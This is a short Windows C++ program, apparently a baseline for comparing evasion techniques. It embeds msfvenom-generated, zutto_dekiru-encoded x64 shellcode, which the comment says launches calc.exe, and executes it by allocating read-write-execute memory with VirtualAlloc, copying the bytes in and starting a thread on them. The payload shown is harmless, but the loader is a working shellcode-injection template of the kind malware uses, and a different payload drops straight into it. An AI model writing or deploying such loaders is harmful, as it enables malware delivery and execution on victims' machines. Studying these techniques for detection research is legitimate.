// x86_64-w64-mingw32-g++.exe main_rx.cpp -o badAsm_rx.exe -masm=intel -O0

#include <Windows.h>

// dummy baseline program written for comparative analysis of techniques

int main(int argc, char * argv[])
{

	// msfvenom -p windows/x64/exec EXITFUNC=none CMD=calc.exe -f c -a x64 -e x64/zutto_dekiru -b \x00 
	BYTE payload[] = {0x4d,0x31,0xed,0x48,0x89,0xe5,0xdd,
	0xc2,0x66,0x81,0xe5,0x50,0xfc,0x48,0x0f,0xae,0x45,0x00,0x41,
	0xb5,0x23,0x49,0xbf,0x11,0xaf,0x6a,0x18,0x61,0x7f,0x86,0xa7,
	0x48,0x83,0xc5,0x08,0x4c,0x8b,0x45,0x00,0x49,0xff,0xcd,0x4f,
	0x31,0x7c,0xe8,0x2e,0x4d,0x85,0xed,0x75,0xf3,0xed,0xe7,0xe9,
	0xfc,0x91,0x97,0x46,0xa7,0x11,0xaf,0x2b,0x49,0x20,0x2f,0xd4,
	0xf6,0x47,0xe7,0x5b,0xca,0x04,0x37,0x0d,0xf5,0x71,0xe7,0xe1,
	0x4a,0x79,0x37,0x0d,0xf5,0x31,0xe7,0xe1,0x6a,0x31,0x37,0x89,
	0x10,0x5b,0xe5,0x27,0x29,0xa8,0x37,0xb7,0x67,0xbd,0x93,0x0b,
	0x64,0x63,0x53,0xa6,0xe6,0xd0,0x66,0x67,0x59,0x60,0xbe,0x64,
	0x4a,0x43,0xee,0x3b,0x50,0xea,0x2d,0xa6,0x2c,0x53,0x93,0x22,
	0x19,0xb1,0xf4,0x06,0x2f,0x11,0xaf,0x6a,0x50,0xe4,0xbf,0xf2,
	0xc0,0x59,0xae,0xba,0x48,0xea,0x37,0x9e,0xe3,0x9a,0xef,0x4a,
	0x51,0x60,0xaf,0x65,0xf1,0x59,0x50,0xa3,0x59,0xea,0x4b,0x0e,
	0xef,0x10,0x79,0x27,0x29,0xa8,0x37,0xb7,0x67,0xbd,0xee,0xab,
	0xd1,0x6c,0x3e,0x87,0x66,0x29,0x4f,0x1f,0xe9,0x2d,0x7c,0xca,
	0x83,0x19,0xea,0x53,0xc9,0x14,0xa7,0xde,0xe3,0x9a,0xef,0x4e,
	0x51,0x60,0xaf,0xe0,0xe6,0x9a,0xa3,0x22,0x5c,0xea,0x3f,0x9a,
	0xee,0x10,0x7f,0x2b,0x93,0x65,0xf7,0xce,0xa6,0xc1,0xee,0x32,
	0x59,0x39,0x21,0xdf,0xfd,0x50,0xf7,0x2b,0x41,0x20,0x25,0xce,
	0x24,0xfd,0x8f,0x2b,0x4a,0x9e,0x9f,0xde,0xe6,0x48,0xf5,0x22,
	0x93,0x73,0x96,0xd1,0x58,0xee,0x50,0x37,0x50,0xdb,0x7e,0x86,
	0xa7,0x11,0xaf,0x6a,0x18,0x61,0x37,0x0b,0x2a,0x10,0xae,0x6a,
	0x18,0x20,0xc5,0xb7,0x2c,0x7e,0x28,0x95,0xcd,0xda,0xd5,0x43,
	0x45,0x4c,0xee,0xd0,0xbe,0xf4,0xc2,0x1b,0x58,0xc4,0xe7,0xe9,
	0xdc,0x49,0x43,0x80,0xdb,0x1b,0x2f,0x91,0xf8,0x14,0x7a,0x3d,
	0xe0,0x02,0xdd,0x05,0x72,0x61,0x26,0xc7,0x2e,0xcb,0x50,0xbf,
	0x7b,0x00,0x13,0xe5,0x89,0x74,0xd7,0x0f,0x18,0x6d,0x58,0xcc,
	0x36};
	
	size_t payload_len = sizeof(payload);

	//allocate executable payload in memory
	auto exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	//copy our encrypted payload into that memory
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	//execute our payload
	auto th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
	if(th != NULL){
		WaitForSingleObject(th, -1);
	}

	return 0;
}
